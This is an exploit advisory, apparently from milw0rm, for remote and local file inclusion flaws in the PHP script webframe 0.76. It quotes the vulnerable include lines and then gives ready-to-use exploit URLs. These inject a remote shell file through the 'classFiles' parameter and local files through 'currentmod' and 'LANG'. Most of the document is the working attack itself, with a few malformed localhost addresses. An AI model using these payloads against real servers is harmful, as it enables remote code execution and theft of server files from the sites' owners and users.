@@ -1,0 +1,55 @@
+                          -----------------[-Rfi/Lfi-]-----------------
+
+script:webframe 0.76
+   
+------------------------------------------------------------------
+download from:http://downloads.sourceforge.net/phpwebframe/webframe-0.76-src.tar.gz?modtime=1155546760&big_mirror=0
+   
+------------------------------------------------------------------
+
+........................................................
+vul1: /mod/admin/doc/index.php line 3;
+
+ include_once "$classFiles/xml.php";
+==============================================
+vul2:/mod/index.php line 5,7,9,11,13;
+
+include_once "$classFiles/table.php";
+//html class
+include_once "$classFiles/html.php"; 
+//Database class
+include_once "$classFiles/mysql.php";
+//Form class
+include_once "$classFiles/form.php";
+//Language file
+include "../$currentmod/lang/$LANG.php"; ----> = lfi
+============================================================
+vul3: /mod/base/menu.php line 17;
+
+  include_once "$classFiles/mysql.php
+============================================================
+-----------------------------------------------------
+
+xpl rfi:
+
+http://127.0..0.1/path/mod/admin/doc/index.php?classFiles=[shell.txt?]
+
+http://127.0.0.1/path/mod/index.php?classFiles=[shell.txt?]
+
+http://127.0.0..1/path/mod/base/menu.php?classFiles=[shell.txt?]
+
+xpl lfi:
+
+http://127.0.0.1/path/mod/index.php?currentmod=[Lfi]
+
+http://127.0.0.1/path/mod/index.php?LANG=[Lfi]
+
+***************************************************
+***************************************************
+---------------------------------------------------
+Author: ahmadbady [kivi_hacker666@yahoo.com]
+
+from[iran]
+---------------------------------------------------
+
+# milw0rm.com [2009-02-09]
